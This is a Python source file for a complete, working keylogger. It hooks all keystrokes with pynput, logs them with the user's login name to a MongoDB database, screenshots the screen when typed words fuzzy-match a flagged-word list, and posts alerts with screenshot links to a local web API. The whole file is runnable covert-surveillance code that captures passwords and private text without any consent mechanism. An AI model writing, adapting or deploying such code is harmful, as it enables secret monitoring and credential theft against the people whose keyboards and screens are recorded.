import atexit
from pynput import keyboard
import time
import pymongo
from datetime import datetime
import threading
import queue
import os
import logging
import fuzzy_detector as fuzzy_detector
import pyautogui
from io import BytesIO
import gridfs
import requests  # Import requests

# Set up basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# MongoDB Configuration
MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017/")
DATABASE_NAME = "keylogger_db"
COLLECTION_NAME = "keylogs"

# Keylog queue
keylog_queue = queue.Queue(maxsize=1000)

# Constants
BATCH_SIZE = 50
FLUSH_INTERVAL = 10
QUEUE_FULL_SLEEP = 0.1
QUEUE_EMPTY_SLEEP = 1
HEARTBEAT_INTERVAL = 60

# Global variables
current_buffer = ""
last_flush_time = time.time()
collection = None
batch = []

# --- Flask App URL (for pushing notifications) ---
FLASK_APP_URL = "http://localhost:5000/api"  # IMPORTANT:  Correct URL

def get_mongodb_collection():
    try:
        client = pymongo.MongoClient(MONGO_URI)
        db = client[DATABASE_NAME]
        logging.info("MongoDB connection successful")
        return db[COLLECTION_NAME]
    except pymongo.errors.ConnectionFailure as e:
        logging.error(f"MongoDB connection error: {e}")
        raise

def flush_buffer_to_queue():
    global current_buffer
    if current_buffer:
        current_time = datetime.utcnow()
        log_data = {
            "timestamp": current_time,
            "userId": os.getlogin(),
            "eventType": "keypress",
            "eventData": {
                "key": current_buffer,
                "modifiers": [],
                "windowTitle": "N/A"
            }
        }
        try:
            keylog_queue.put(log_data, block=False)
        except queue.Full:
            logging.warning("Keylog queue is full, dropping text event")
            time.sleep(QUEUE_FULL_SLEEP)
        current_buffer = ""

def write_logs_to_db():
    global batch, last_flush_time, collection
    client = pymongo.MongoClient(MONGO_URI)
    db = client[DATABASE_NAME]
    collection = get_mongodb_collection()
    fs = gridfs.GridFS(db)

    words_json = fuzzy_detector.load_words_json()
    if not words_json:
        logging.error("Failed to load words from words.json. Fuzzy matching won't work.")

    while True:
        try:
            keylog_data = keylog_queue.get_nowait()
            if "eventData" in keylog_data and "key" in keylog_data["eventData"]:
                text_to_check = keylog_data["eventData"]["key"]
                if words_json:
                    words = text_to_check.split()
                    for word in words:
                        if (bad_word := fuzzy_detector.check_word(word, words_json)):
                            logging.warning(f"Flagged word detected: {word} fuzzy match: {bad_word[0]} confidence: {bad_word[1]}")
                            screenshot_bytes = take_screenshot()
                            screenshot_id = fs.put(screenshot_bytes)

                            screenshot_data = {
                                "screenshot_id": screenshot_id,
                                "timestamp": datetime.utcnow(),
                                "userId": os.getlogin(),
                                "eventType": "screenshot",
                                "eventData": {"screenshot_id": screenshot_id}
                            }
                            keylog_data.setdefault("flags", []).append("fuzzy_match")
                            keylog_data.setdefault("flagged_word_similar_to", []).append(bad_word[0])
                            keylog_data['screenshot_data'] = screenshot_data

                            # --- Push Notification (using requests) ---
                            screenshot_url = f"{FLASK_APP_URL}/screenshots/{screenshot_id}"
                            try:
                                requests.post(f"{FLASK_APP_URL}/push_notification", json={
                                    "flagged_word": bad_word[0],
                                    "user_id": os.getlogin(),
                                    "screenshot_url": screenshot_url
                                })
                            except requests.exceptions.RequestException as e:
                                logging.error(f"Failed to push notification: {e}")
                            # --- End Push Notification ---

                            break

            batch.append(keylog_data)
            if len(batch) >= BATCH_SIZE or (time.time() - last_flush_time) >= FLUSH_INTERVAL:
                if batch:
                    try:
                        collection.insert_many(batch)
                        logging.info(f"Inserted {len(batch)} keylogs into MongoDB")
                    except pymongo.errors.BulkWriteError as e:
                        logging.error(f"Error inserting to database: {e.details}")
                    except Exception as ex:
                        logging.exception(f"An unexpected error occurred: {ex}")
                    batch = []
                    last_flush_time = time.time()

        except queue.Empty:
            logging.debug("Keylog queue is empty, waiting...")
            time.sleep(QUEUE_EMPTY_SLEEP)
        except Exception as e:
            logging.error(f"Unexpected error in database writer thread: {e}")

def take_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_arr = BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr

def get_screenshot(screenshot_id):
    """Retrieves a screenshot from GridFS given its ID."""
    client = pymongo.MongoClient(MONGO_URI)
    db = client[DATABASE_NAME]
    fs = gridfs.GridFS(db)
    try:
        image_data = fs.get(screenshot_id).read()
        return image_data
    except Exception as e:
        logging.error(f"Error retrieving screenshot: {e}")
        return None

def write_screenshot_to_file(screenshot_id):
    screenshot_bytes = get_screenshot(screenshot_id)
    with open("screenshot.png", "wb") as f:
        f.write(screenshot_bytes)

def log_heartbeat():
    current_time = datetime.utcnow()
    keylog_data = {
        "timestamp": current_time,
        "userId": os.getlogin(),
        "eventType": "heartbeat",
        "eventData": {"message": "No key press event logged in the past 60 seconds"}
    }
    try:
        keylog_queue.put(keylog_data, block=False)
        flush_buffer_to_queue()
    except queue.Full:
        logging.warning("Keylog queue is full, heartbeat event dropped")

    threading.Timer(HEARTBEAT_INTERVAL, log_heartbeat).start()

db_thread = threading.Thread(target=write_logs_to_db, daemon=True)
db_thread.start()

threading.Timer(HEARTBEAT_INTERVAL, log_heartbeat).start()

def on_press(key):
    global current_buffer

    try:
        if key == keyboard.Key.space:
            flush_buffer_to_queue()
        elif key == keyboard.Key.enter:
            flush_buffer_to_queue()
        elif key == keyboard.Key.backspace:
           current_buffer = current_buffer[:-1]
        elif hasattr(key, 'char'):
            current_buffer += key.char
        logging.debug(f"Current buffer: {current_buffer}")

    except AttributeError as e:
        logging.debug(f"Key {key} does not have a char: {e}")

def flush_remaining_logs():
    global batch, last_flush_time
    flush_buffer_to_queue()
    if batch:
        try:
            collection.insert_many(batch)
            logging.info(f"Flushed remaining {len(batch)} keylogs into MongoDB on exit")
        except pymongo.errors.BulkWriteError as e:
            logging.error(f"Error inserting to database during flushing: {e.details}")
        batch = []
        last_flush_time = time.time()

atexit.register(flush_remaining_logs)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()